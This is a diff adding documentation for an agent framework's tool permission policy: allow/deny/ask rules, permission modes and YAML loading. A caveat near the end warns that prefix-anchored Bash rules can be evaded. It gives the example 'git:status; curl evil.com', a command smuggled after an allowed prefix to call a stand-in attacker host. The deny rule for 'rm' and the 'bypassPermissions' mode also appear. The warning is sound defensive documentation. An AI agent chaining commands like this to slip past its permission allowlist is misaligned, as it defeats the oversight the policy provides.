@@ -246,6 +246,98 @@ Health route configuration. By default `createAgentApp` mounts `GET /health` and
 
 ---
 
+### `permissionPolicy`
+
+```ts
+permissionPolicy?: ToolPermissionPolicy
+```
+
+Optional permission policy applied to all sessions served by this app.
+
+When set, tools evaluate the policy via their `checkPermissions` hook before executing.
+The policy is forwarded through `AgentrailProfileContext.permissionPolicy` →
+`CapabilityBuildContext.permissionPolicy` into each capability's tool set.
+
+```ts
+import { parseRules } from "@agentrail/capabilities";
+
+const app = createAgentApp({
+  dataDir: "./data",
+  profiles: [myProfile],
+  permissionPolicy: {
+    mode: "default",
+    // Bash rules use "verb:args" DSL — "git:*" matches any git command
+    allow: parseRules(["Bash(git:*)", "Bash(npm:*)"]),
+    deny: parseRules(["Bash(rm:*)"]),
+    ask: parseRules(["Write", "Edit"]),
+  },
+});
+```
+
+The Bash DSL uses a `verb:args` form: `"git:*"` matches any command whose first word is `git`
+(e.g. `git status`, `git log --oneline`, `git add src/main.ts`). The tool normalises
+`"git status"` → `"git:status"` before pattern matching. The `*` wildcard in Bash patterns
+matches across `/` so path arguments in commands are matched correctly.
+
+**Permission modes:**
+
+| `mode` | Default outcome | Description |
+|--------|----------------|-------------|
+| `"default"` | `allow` | Opt-in deny/ask. Only rules explicitly listed in `deny`/`ask` block tool calls. |
+| `"strict"` | `deny` | Deny-by-default. Only operations listed in `allow` are permitted; everything else is blocked. Use for minimal-privilege configurations. |
+| `"acceptEdits"` | `allow` | Like `default`, but `ask` decisions for `Write`/`Edit` tools are auto-approved. |
+| `"dontAsk"` | `allow` | Like `default`, but `ask` decisions are demoted to `deny` (headless environments). |
+| `"bypassPermissions"` | `allow` | All checks skipped (trusted automation only). |
+
+**Strict (deny-by-default) allowlist example:**
+
+```ts
+import { parseRules } from "@agentrail/capabilities";
+
+const app = createAgentApp({
+  permissionPolicy: {
+    mode: "strict",          // deny anything not explicitly allowed
+    allow: parseRules([
+      "Bash(git:*)",         // prefix-match: any content starting with "git:"
+      "Bash(npm:*)",         // prefix-match: any content starting with "npm:"
+      "Read",                // permit all file reads
+    ]),
+    deny: [],
+    ask: [],
+  },
+});
+```
+
+> **Bash rule caveat:** Bash patterns are **prefix-anchored** (no trailing
+> `$`). `Bash(git:*)` matches any normalised command whose first word is
+> `git`, but it also matches shell strings that merely *start* with `git:`
+> — including chained forms like `git:status; curl evil.com`.  Bash rules
+> are useful for coarse-grained allow/deny (e.g. block all `rm` calls), but
+> they cannot provide strict command confinement.  For strong shell
+> isolation, run agents in the sandboxed environment.
+
+**Loading from `agentrail.yaml`:**
+
+When `config.permissions` is set, use `configPermissionsToPolicy` to convert the raw YAML config
+into a runtime `ToolPermissionPolicy`:
+
+```ts
+import { createAgentApp, loadAgentrailConfig, configPermissionsToPolicy } from "@agentrail/app";
+
+const config = loadAgentrailConfig();
+const app = createAgentApp({
+  dataDir: "./data",
+  profiles: [myProfile],
+  permissionPolicy: config.permissions
+    ? configPermissionsToPolicy(config.permissions)
+    : undefined,
+});
+```
+
+See the [Permissions Guide](/guides/tool-permissions) for the full DSL reference.
+
+---
+
 ### `telemetrySink`
 
 ```ts
